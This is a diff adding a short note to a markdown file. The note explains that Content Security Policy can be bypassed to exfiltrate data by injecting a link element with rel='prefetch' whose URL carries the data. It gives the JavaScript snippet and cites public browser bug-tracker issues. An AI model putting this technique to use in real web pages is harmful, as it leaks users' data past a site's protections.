@@ -172,3 +172,18 @@ myPoint = point 1 3
 
 main = y |> toString |> text
 ```
+
+---
+
+You can circumvent CSP in JavaScript for exfiltrating data!
+
+```js
+const linkEl = document.createElement('link');
+linkEl.rel = 'prefetch';
+linkEl.href = urlWithYourPreciousData;
+document.head.appendChild(linkEl);
+```
+
+CSP doesn't restrict `prefetch`, `prerender`, `dns-prefetch`, or `preconnect`
+https://bugs.chromium.org/p/chromium/issues/detail?id=663620
+https://github.com/w3c/webappsec-csp/issues/107
